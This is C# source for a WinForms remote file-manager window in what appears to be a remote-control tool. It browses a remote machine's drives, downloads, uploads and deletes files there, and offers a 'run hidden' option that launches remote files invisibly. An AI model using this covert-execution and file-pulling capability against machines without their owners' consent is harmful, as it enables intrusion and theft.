using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Response;

namespace RemoteControl.SubController
{
    public class FrmFileManager : Form
    {
        private readonly SocketSession _session;
        private ListView _listView;
        private ToolStrip _toolStrip;
        private Label _lblPath;
        private string _currentDir;

        // Upload state
        private Dictionary<string, FileStream> _uploadStreams
            = new Dictionary<string, FileStream>();

        public FrmFileManager(SocketSession session)
        {
            _session = session;
            InitializeUI();
            this.Text = "文件管理 - " + (session.HostName ?? session.SocketId);
            this.Load += FrmFileManager_Load;
        }

        private void InitializeUI()
        {
            this.Size = new Size(900, 600);
            this.StartPosition = FormStartPosition.CenterScreen;

            _toolStrip = new ToolStrip();
            var btnBack = new ToolStripButton("返回上级");
            btnBack.Click += BtnBack_Click;
            var btnRefresh = new ToolStripButton("刷新");
            btnRefresh.Click += BtnRefresh_Click;
            var btnUpload = new ToolStripButton("上传文件");
            btnUpload.Click += BtnUpload_Click;
            var btnNewDir = new ToolStripButton("新建文件夹");
            btnNewDir.Click += BtnNewDir_Click;
            _toolStrip.Items.AddRange(new ToolStripItem[] {
                btnBack, new ToolStripSeparator(),
                btnRefresh, new ToolStripSeparator(),
                btnUpload, btnNewDir
            });

            var pathPanel = new Panel();
            pathPanel.Dock = DockStyle.Top;
            pathPanel.Height = 24;
            _lblPath = new Label();
            _lblPath.Dock = DockStyle.Fill;
            _lblPath.Text = "路径: /";
            _lblPath.TextAlign = ContentAlignment.MiddleLeft;
            pathPanel.Controls.Add(_lblPath);

            _listView = new ListView();
            _listView.Dock = DockStyle.Fill;
            _listView.View = View.Details;
            _listView.FullRowSelect = true;
            _listView.GridLines = true;
            _listView.Font = new Font("微软雅黑", 9F);
            _listView.Columns.Add("名称", 280);
            _listView.Columns.Add("大小", 100);
            _listView.Columns.Add("类型", 80);
            _listView.Columns.Add("修改时间", 160);
            _listView.DoubleClick += ListView_DoubleClick;
            _listView.ContextMenuStrip = CreateContextMenu();

            this.Controls.Add(_listView);
            this.Controls.Add(pathPanel);
            this.Controls.Add(_toolStrip);
        }

        private ContextMenuStrip CreateContextMenu()
        {
            var cms = new ContextMenuStrip();
            cms.Items.Add("打开/进入", null, (s, e) => OpenSelected());
            cms.Items.Add("下载文件", null, (s, e) => DownloadSelected());
            cms.Items.Add("隐藏运行", null, (s, e) => RunHidden());
            cms.Items.Add(new ToolStripSeparator());
            cms.Items.Add("删除", null, (s, e) => DeleteSelected());
            cms.Items.Add("刷新", null, (s, e) => RefreshCurrentDir());
            return cms;
        }

        private void FrmFileManager_Load(object sender, EventArgs e)
        {
            RequestDriveList();
        }

        private void RequestDriveList()
        {
            _currentDir = null;
            _lblPath.Text = "路径: /（驱动器列表）";
            _session.Send(ePacketType.PACKET_GET_DRIVES_EX_REQUEST, null);
        }

        private void RequestFileList(string dir)
        {
            _currentDir = dir;
            _lblPath.Text = "路径: " + dir;
            var req = new RequestGetSubFilesOrDirs();
            req.parentDir = dir;
            _session.Send(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, req);
        }

        private void RefreshCurrentDir()
        {
            if (string.IsNullOrEmpty(_currentDir))
                RequestDriveList();
            else
                RequestFileList(_currentDir);
        }

        #region Response Handlers

        public void HandleResponse(ePacketType type, object obj)
        {
            switch (type)
            {
                case ePacketType.PACKET_GET_DRIVES_EX_RESPONSE:
                    HandleDrivesResponse(obj as ResponseGetDrivesEx);
                    break;
                case ePacketType.PACKET_GET_SUBFILES_OR_DIRS_RESPONSE:
                    HandleFilesResponse(obj as ResponseGetSubFilesOrDirs);
                    break;
                case ePacketType.PACKET_CREATE_FILE_OR_DIR_RESPONSE:
                case ePacketType.PACKET_DELETE_FILE_OR_DIR_RESPONSE:
                    this.BeginInvoke((Action)RefreshCurrentDir);
                    break;
            }
        }

        private void HandleDrivesResponse(ResponseGetDrivesEx resp)
        {
            if (resp == null || resp.Drives == null) return;
            this.BeginInvoke((Action)(() =>
            {
                _listView.Items.Clear();
                foreach (var drv in resp.Drives)
                {
                    var item = new ListViewItem(drv.Name);
                    item.SubItems.Add(FormatSize(drv.TotalSize));
                    item.SubItems.Add("驱动器");
                    item.SubItems.Add("");
                    item.Tag = "drive";
                    _listView.Items.Add(item);
                }
            }));
        }

        public void HandleFilesResponse(ResponseGetSubFilesOrDirs resp)
        {
            if (resp == null) return;
            this.BeginInvoke((Action)(() =>
            {
                _listView.Items.Clear();
                if (resp.dirs != null)
                {
                    foreach (var d in resp.dirs)
                    {
                        string name = Path.GetFileName(d.DirPath);
                        if (string.IsNullOrEmpty(name)) name = d.DirPath;
                        var item = new ListViewItem(name);
                        item.SubItems.Add("");
                        item.SubItems.Add("文件夹");
                        item.SubItems.Add(d.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"));
                        item.Tag = "dir";
                        _listView.Items.Add(item);
                    }
                }
                if (resp.files != null)
                {
                    foreach (var f in resp.files)
                    {
                        string name = Path.GetFileName(f.FilePath);
                        if (string.IsNullOrEmpty(name)) name = f.FilePath;
                        var item = new ListViewItem(name);
                        item.SubItems.Add(FormatSize(f.Size));
                        item.SubItems.Add("文件");
                        item.SubItems.Add(f.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"));
                        item.Tag = "file";
                        _listView.Items.Add(item);
                    }
                }
            }));
        }

        #endregion

        #region UI Actions

        private void ListView_DoubleClick(object sender, EventArgs e)
        {
            OpenSelected();
        }

        private void OpenSelected()
        {
            if (_listView.SelectedItems.Count == 0) return;
            var item = _listView.SelectedItems[0];
            string tag = item.Tag as string;

            if (tag == "drive" || tag == "dir")
            {
                string path = GetFullPath(item.Text);
                RequestFileList(path);
            }
            else if (tag == "file")
            {
                string path = GetFullPath(item.Text);
                var req = new RequestOpenFile();
                req.FilePath = path;
                req.IsHide = false;
                _session.Send(ePacketType.PACKET_OPEN_FILE_REQUEST, req);
            }
        }

        private void DownloadSelected()
        {
            if (_listView.SelectedItems.Count == 0) return;
            var item = _listView.SelectedItems[0];
            if ((item.Tag as string) != "file") return;

            string remotePath = GetFullPath(item.Text);
            using (var dlg = new SaveFileDialog())
            {
                dlg.FileName = item.Text;
                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    var req = new RequestStartDownload();
                    req.Path = remotePath;
                    req.SavePath = dlg.FileName;
                    _session.Send(ePacketType.PACKET_START_DOWNLOAD_REQUEST, req);
                }
            }
        }

        private void RunHidden()
        {
            if (_listView.SelectedItems.Count == 0) return;
            var item = _listView.SelectedItems[0];
            if ((item.Tag as string) != "file") return;

            string path = GetFullPath(item.Text);
            var req = new RequestOpenFile();
            req.FilePath = path;
            req.IsHide = true;
            _session.Send(ePacketType.PACKET_OPEN_FILE_REQUEST, req);
        }

        private void DeleteSelected()
        {
            if (_listView.SelectedItems.Count == 0) return;
            var item = _listView.SelectedItems[0];
            string tag = item.Tag as string;
            if (tag != "file" && tag != "dir") return;

            if (MessageBox.Show("确定删除 \"" + item.Text + "\"？",
                "确认", MessageBoxButtons.YesNo) != DialogResult.Yes)
                return;

            string path = GetFullPath(item.Text);
            var req = new RequestDeleteFileOrDir();
            req.Path = path;
            req.PathType = (tag == "dir") ? ePathType.Directory : ePathType.File;
            _session.Send(ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST, req);

            // Refresh after short delay
            ThreadPool.QueueUserWorkItem(_ =>
            {
                Thread.Sleep(500);
                this.BeginInvoke((Action)RefreshCurrentDir);
            });
        }

        private void BtnBack_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(_currentDir))
                return;

            string parent = Path.GetDirectoryName(_currentDir);
            if (string.IsNullOrEmpty(parent))
                RequestDriveList();
            else
                RequestFileList(parent);
        }

        private void BtnRefresh_Click(object sender, EventArgs e)
        {
            RefreshCurrentDir();
        }

        private void BtnUpload_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(_currentDir))
            {
                MessageBox.Show("请先进入一个目录！");
                return;
            }

            using (var dlg = new OpenFileDialog())
            {
                dlg.Multiselect = false;
                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    StartUpload(dlg.FileName);
                }
            }
        }

        private void BtnNewDir_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(_currentDir))
            {
                MessageBox.Show("请先进入一个目录！");
                return;
            }

            string name = ShowInput("新建文件夹", "请输入文件夹名称：");
            if (string.IsNullOrEmpty(name)) return;

            var req = new RequestCreateFileOrDir();
            req.PathType = ePathType.Directory;
            req.Path = Path.Combine(_currentDir, name);
            _session.Send(ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST, req);

            ThreadPool.QueueUserWorkItem(_ =>
            {
                Thread.Sleep(500);
                this.BeginInvoke((Action)RefreshCurrentDir);
            });
        }

        private void StartUpload(string localPath)
        {
            string remotePath = _currentDir.TrimEnd('\\') + "\\" +
                Path.GetFileName(localPath);
            var req = new RequestStartUploadHeader();
            req.From = localPath;
            req.To = remotePath;
            string fileId = Guid.NewGuid().ToString();
            req.Id = fileId;
            _session.Send(ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST, req);

            // Start uploading in background
            var fs = new FileStream(localPath, FileMode.Open, FileAccess.Read);
            _uploadStreams[fileId] = fs;
            new Thread(() => DoUpload(fileId, fs))
            { IsBackground = true }.Start();
        }

        private void DoUpload(string fileId, FileStream fs)
        {
            try
            {
                byte[] buffer = new byte[40960];
                int read;
                while ((read = fs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    byte[] data = new byte[read];
                    Array.Copy(buffer, data, read);
                    var pkt = new ResponseStartUpload();
                    pkt.Id = fileId;
                    pkt.Data = data;
                    _session.Send(ePacketType.PACKET_START_UPLOAD_RESPONSE, pkt);
                    Thread.Sleep(10);
                }
            }
            finally
            {
                fs.Close();
                _uploadStreams.Remove(fileId);
                this.BeginInvoke((Action)(() =>
                {
                    MessageBox.Show("上传完成！", "提示");
                    RefreshCurrentDir();
                }));
            }
        }

        #endregion

        #region Helpers

        private string GetFullPath(string name)
        {
            if (string.IsNullOrEmpty(_currentDir))
                return name;
            return Path.Combine(_currentDir, name);
        }

        private static string FormatSize(long bytes)
        {
            if (bytes <= 0) return "";
            string[] units = { "B", "KB", "MB", "GB", "TB" };
            int idx = 0;
            double size = bytes;
            while (size >= 1024 && idx < units.Length - 1)
            {
                size /= 1024;
                idx++;
            }
            return string.Format("{0:0.##} {1}", size, units[idx]);
        }

        private string ShowInput(string title, string prompt)
        {
            using (var frm = new Form())
            {
                frm.Text = title;
                frm.Size = new Size(350, 150);
                frm.StartPosition = FormStartPosition.CenterParent;
                frm.FormBorderStyle = FormBorderStyle.FixedDialog;
                frm.MaximizeBox = false;
                frm.MinimizeBox = false;

                var lbl = new Label { Text = prompt, Left = 10, Top = 12, AutoSize = true };
                var txt = new TextBox { Left = 10, Top = 35, Width = 310 };
                var btnOk = new Button { Text = "确定", Left = 170, Top = 70, Width = 70 };
                var btnCancel = new Button { Text = "取消", Left = 250, Top = 70, Width = 70 };
                btnOk.DialogResult = DialogResult.OK;
                btnCancel.DialogResult = DialogResult.Cancel;
                frm.AcceptButton = btnOk;
                frm.CancelButton = btnCancel;
                frm.Controls.AddRange(new Control[] { lbl, txt, btnOk, btnCancel });

                if (frm.ShowDialog(this) == DialogResult.OK)
                    return txt.Text.Trim();
                return null;
            }
        }

        #endregion
    }
}
